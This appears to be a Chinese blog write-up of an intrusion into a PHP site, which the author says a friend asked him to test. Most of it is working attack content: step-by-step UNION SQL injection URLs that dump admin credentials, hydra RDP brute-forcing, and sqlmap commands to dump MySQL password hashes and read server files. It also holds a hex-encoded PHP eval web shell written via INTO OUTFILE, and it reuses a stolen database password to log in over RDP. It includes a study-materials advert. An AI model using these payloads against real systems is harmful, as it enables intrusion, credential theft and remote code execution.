## **0X01 背景**

自己之前写过一篇记录，当时是由于之前是一位校友刚做开发，叫我友情帮忙测试一波，由于是开发的新手，漏洞比较多，所以直接从注入开始讲起，但是到getshell的过程也算是一场峰回路转再跌跌撞撞的路程。

## 0x02 注入测试

判断注入是否存在

http://11X.XX.XXX.XX/test/sub_hack.php?id=229 or '1'='1'

显示数据

![news-2018070902\(01\).png](https://image.3001.net/images/20230427/1682584124_644a323cbc72b841d115c.png!small)

  

http://11X.XX.XXX.XX/test/sub_hack.php?id=229 or '1'='2'

显示非原本数据

![news-2018070902\(02\).png](https://image.3001.net/images/20230427/1682584125_644a323db370d3c2f4e77.png!small)

  

判断存在sql注入后，通过order by 子句判断有几个字段

Order by 从1开始，大概选个数逐个去尝试，二分法是最普通的，还可以开根法，还有是方程式法，再好玩一点就动态规划。推荐下面这篇文章，非常有趣，很好懂。

https://mp.weixin.qq.com/s/nMC55qvgsQNQfncAEOM20Q

试到前一个数返回正常，后一个报错，就说明长度是多少了，示例如下

http://11X.XX.XXX.XX/test/sub_hack.php?id=229 order by 27

返回正常

![news-2018070902\(03\).png](https://image.3001.net/images/20230427/1682584126_644a323ea35279ec04713.png!small)

  

那试试payload

http://11X.XX.XXX.XX/test/sub_hack.php?id=229 order by 28

28返回不正常

![news-2018070902\(04\).png](https://image.3001.net/images/20230427/1682584127_644a323fb9dba3cd2f43b.png!small)

  

那么可以说明他字段个数是27，而且后面要用到这个数字。

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

第二步：联合查询

http://11X.XX.XXX.XX/test/sub_hack.php?id=229 and 1=2 UNION SELECT
1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27

提交后，可以看到页面中出现可以被显示的字段编号，我们通过在响应位置替换成我们需要的查询字段和表就可以了。

![news-2018070902\(05\).png](https://image.3001.net/images/20230427/1682584128_644a32409d196b8ef507a.png!small)

  

对应的数字就会显示在页面中，我把对应数字改成sql语句，就会得到sql查询结果

举例子：

http://11X.XX.XXX.XX/test/sub_hack.php?id=229 and 1=2 UNION SELECT
1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,@@version,17,18,19,20,@@datadir,22,23,24,25,26,27

知识点补充：

database()查看当前数据库

@@version查询mysql版本

@@datadir查询数据库路径

我把原来的5，15，21改成查数据库名，mysql版本，数据路径，就会在相应的地方显示出来

![news-2018070902\(06\).png](https://image.3001.net/images/20230427/1682584129_644a324189bfc829f12d2.png!small)

  

查询所有数据库名：group_concat(SCHEMA_NAME)

http://11X.XX.XXX.XX/test/sub_hack.php?id=229 and 1=2 UNION SELECT
1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,@@version,17,18,19,20,@@datadir,group_concat(SCHEMA_NAME),23,24,25,26,27
from information_schema.schemata

![news-2018070902\(07\).png](https://image.3001.net/images/20230427/1682584130_644a32429c6f748ab1566.png!small)

  

查询当前数据库所有表名：group_concat(table_name)

http://11X.XX.XXX.XX/test/sub_hack.php?id=229 and 1=2 UNION SELECT
1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,@@version,17,18,19,20,@@datadir,group_concat(table_name),23,24,25,26,27
from information_schema.tables where table_schema=database()

![news-2018070902\(08\).png](https://image.3001.net/images/20230427/1682584131_644a3243ac4cca21d46d2.png!small)

  

上述图发现表名：admin，

要查询查询表中的字段先把表名转换为16进制（标黄为表名的16进制转换值）

group_concat(column_name)

http://11X.XX.XXX.XX/test/sub_hack.php?id=229 and 1=2 UNION SELECT
1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,@@version,17,18,19,20,@@datadir,group_concat(column_name),23,24,25,26,27
from information_schema.columns where table_name=0x61646D696E

![news-2018070902\(09\).png](https://image.3001.net/images/20230427/1682584132_644a3244b06fcec73432e.png!small)

  

![news-2018070902\(10\).png](https://image.3001.net/images/20230427/1682584133_644a3245709caea293097.png!small)

  

发现其字段有

user_id,username,userpassword

下一步只需要查询username和userpassword即可

group_concat(username,0x7c,userpassword)

http://11X.XX.XXX.XX/test/sub_hack.php?id=229 and 1=2 UNION SELECT
1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,@@version,17,18,19,20,@@datadir,group_concat(username,0x7c,userpassword),23,24,25,26,27
from admin

![news-2018070902\(11\).png](https://image.3001.net/images/20230427/1682584134_644a32466234151f9a4ed.png!small)

  

## 0x03 峰回路转

到此，我们知道了知道用户名为admin，密码为123了

在之前已经在信息收集的地方收集到后台了，然后尝试登陆，登陆成功了

![news-2018070902\(12\).png](https://image.3001.net/images/20230427/1682584135_644a32475a4cde0e828e6.png!small)

  

登进后台发现，是真的没有上传地方阿，也没有其他包含，redis其他服务，学信息安全的男生都不会轻易认输，再查看之前的扫描结果，灵机一动还有一根救命稻草，3389！

nmap -Pn -v -p 3306 11X.XX.XXX.XX

Starting Nmap 7.10 ( https://nmap.org ) at 2015-04-04 22:54

mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is
disabled. Try using --system-dns or specify valid servers with --dns-servers

Initiating SYN Stealth Scan at 22:54

Scanning 11X.XX.XXX.XX [1000 port]

Completed SYN Stealth Scan at 22:54, 0.18s elapsed (1 total ports)

Nmap scan report for 11X.XX.XXX.XX

Host is up (0.013s latency).

PORT STATE SERVICE

80/tcp open http

3306/tcp open mysql

3389/tcp open ms-wbt-server

拿出我的字典，再拿出我的hydra，快速在pentestbox 敲下：

hydra -L F:\cybersec\usrname.txt -P F:\cybersec\ password.txt -Vv -t 1 -w 3 -W
5 11X.XX.XXX.XX rdp

结果跑了自己一个心灰意冷，毫无结果。

  

不过还发现开放3306端口，不是有注入吗，直接连数据库getshell呀

太心急想getshell不一步步手工了，sqlmap走起

查看权限

sqlmap -u http:// 11X.XX.XXX.XX /test/sub_hack.php?id=231 --current-user
--dbms=mysql -v 3

![news-2018070902\(14\).png](https://image.3001.net/images/20230427/1682584136_644a32486a788b3375add.png!small)

  

current user: 'root@localhost'

当前用户是root

![news-2018070902\(15\).png](https://image.3001.net/images/20230427/1682584137_644a32493648859947876.png!small)

  

引发报错找到绝对路径+root权限那我是不是可以写shell了

sqlmap -r C:\Users\sqlpost.txt --time-sec 3 --dbms=mysql --random-agent -D
mysql -T user -C User,Password --dump

![news-2018070902\(16\).png](https://image.3001.net/images/20230427/1682584138_644a324a06b76e59db3b2.png!small)

  

参数：--file-write,--file-dest

当数据库为MySQL，PostgreSQL或Microsoft SQL
Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。

命令如下：

![news-2018070902\(17\).png](https://image.3001.net/images/20230427/1682584139_644a324b05551e4211978.png!small)

  

![news-2018070902\(18\).png](https://image.3001.net/images/20230427/1682584139_644a324bd5d5bc9623547.png!small)

  

结果去访问，又给了自己一个心灰意冷，404

![news-2018070902\(19\).png](https://image.3001.net/images/20230427/1682584141_644a324d1cf4a175c7169.png!small)

  

Root密码md5丢到解密无果。。。

才没有放弃，醒悟发觉sqlmap有个参数—file-read，发现可以下载页面文件

下载下来就是不是能看到数据库连接的信息。

  

sqlmap -u http://11X.XX.XXX.XX/test/sub_hack.php?id=231 --file-read
"C:\\\phpstudy\www\test\sub_hack.php" --dbms=mysql -v 3

![news-2018070902\(21\).png](https://image.3001.net/images/20230427/1682584141_644a324dbfe35a47fa961.png!small)

  

舒服，源码到手，同时发现include数据库连接页面，以同样的方法获取数据库连接密码，开放3306直接连上去，

![news-2018070902\(22\).png](https://image.3001.net/images/20230427/1682584142_644a324ec3097176386f1.png!small)

  

惊喜，意外

![news-2018070902\(24\).png](https://image.3001.net/images/20230427/1682584143_644a324f6ed1d9eab10a0.png!small)

  

正常思路应该是这样的

SELECT 0x3C3F706870206576616C28245F504F53545B276C696E65275D293B3F3E INTO
OUTFILE "C:\phpStudy\WWW\test\shell.php";

直接写shell上去

不过在这之前我尝试了下用他数据库的密码尝试去登陆远程桌面，又一个惊喜，熟悉的对话框。

![news-2018070902\(25\).png](https://image.3001.net/images/20230427/1682584144_644a32502c31dc06b5dac.png!small)

  

然后就到此结束了

## 0x04 划重点

后来才知道现在写shell的函数INTO OUTFILE默认是禁用的了

MySQL在安装时，默认的限制了文件导入导出的路径，是通过配置secure_file_priv的值来实现的

SELECT @@global.secure_file_priv;

查询当前设置的路径

![news-2018070902\(26\).png](https://image.3001.net/images/20230427/1682584144_644a3250dcaeec72bc897.png!small)

  

只能通过修改配置文件来修改

## 0x05 文末福利

最近有需求参考写了一个实时删新增文件的批处理文件。用于对抗赛中防止对手上传webshell的脚本上传秒删。只要保存为bat格式双击运行就ok

> @echo off&Setlocal enabledelayedexpansion
>
> REM 指定路径
>
> cd /d C:\Users\\\Desktop\1
>
> :clearwebshell
>
> for /r . %%a in (*) do (REM 指定时间，超过此时间的文件就删 if "%%~ta" gtr "2018/06/19
> 21:41" echo had been delete "%%a" )
>
> @ping nullnullnull -n 1 >nul
>
> goto :clearwebshell

  

